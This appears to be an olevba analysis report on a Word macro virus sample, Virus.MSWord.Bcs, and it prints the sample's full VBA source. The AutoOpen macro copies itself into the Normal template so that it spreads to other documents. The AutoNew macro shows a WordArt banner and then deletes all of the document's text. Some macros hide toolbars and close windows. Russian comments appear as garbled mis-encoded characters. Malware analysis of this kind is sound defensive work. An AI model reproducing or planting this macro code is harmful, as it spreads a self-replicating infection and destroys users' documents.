olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bcs
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bcs - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Bcs - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoNew()
Attribute AutoNew.VB_Description = "Ìàêðîñ çàïèñàí 22.06.99 Âóðäàëàê Äðàêóëîâè÷ III"
Attribute AutoNew.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Ìàêðîñ1"

' Ìàêðîñ1 Ìàêðîñ
' Ìàêðîñ çàïèñàí 22.06.99 Carleone
    On Error Resume Next
        ActiveDocument.Shapes.AddTextEffect(msoTextEffect13, "ÁÊÑÝèÈÒ", _
        "Times New Roman", 66#, msoTrue, msoFalse, 211.65, 107.3).Select
    Selection.ShapeRange.ScaleWidth 1.21, msoFalse, msoScaleFromBottomRight
    Selection.ShapeRange.ScaleHeight 2.27, msoFalse, msoScaleFromBottomRight
    Selection.ShapeRange.IncrementTop 50.4
    Selection.Collapse
    PauseTime = 3   ' Çàäàåò äëèòåëüíîñòü.
    Start = Timer   ' Çàäàåò íà÷àëî ïàóçû.
    Do While Timer < Start + PauseTime
        DoEvents    ' Ïåðåäàåò óïðàâëåíèå äðóãèì ïðîöåññàì.
    Loop
    Finish = Timer  ' Çàäàåò êîíåö ïàóçû.
 Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Ìàêðîñ çàïèñàí 22.06.99 Âóðäàëàê Äðàêóëîâè÷ III"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Ìàêðîñ3"
'
' Ìàêðîñ3 Ìàêðîñ
' Ìàêðîñ çàïèñàí 22.06.99 Âóðäàëàê Äðàêóëîâè÷ III
'
On Error Resume Next
     Application.OrganizerCopy Source:=NormalTemplate.FullName, _
  Destination:=ActiveDocument.FullName, _
   Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=ActiveDocument.FullName, _
  Destination:=NormalTemplate.FullName, _
  Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
    
End Sub
Sub Ìàêðîñ1()
Attribute Ìàêðîñ1.VB_Description = "Ìàêðîñ çàïèñàí 28.07.00 ÌÑÀ"
Attribute Ìàêðîñ1.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Ìàêðîñ1"
'
' Ìàêðîñ1 Ìàêðîñ
' Ìàêðîñ çàïèñàí 28.07.00 ÌÑÀ
'
    CommandBars("Stop Recording").Visible = False
    ActiveDocument.ToggleFormsDesign
    ActiveWindow.Close
    CommandBars("Visual Basic").Visible = False
    RecentFiles(1).Open
    ActiveWindow.ActivePane.View.Zoom.Percentage = 75
    ActiveWindow.ActivePane.View.Zoom.Percentage = 50
    CommandBars("WordArt").Visible = False
    CommandBars("Standard").Visible = False
    CommandBars("Formatting").Visible = False
    CommandBars("Drawing").Visible = False
    RecentFiles(1).Open
    ActiveWindow.Close
End Sub
Sub Ìàêðîñ2()
Attribute Ìàêðîñ2.VB_Description = "Ìàêðîñ çàïèñàí 20.12.00 ÌÑÀ"
Attribute Ìàêðîñ2.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Ìàêðîñ2"
'
' Ìàêðîñ2 Ìàêðîñ
' Ìàêðîñ çàïèñàí 20.12.00 ÌÑÀ
'
    CommandBars("Stop Recording").Visible = False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

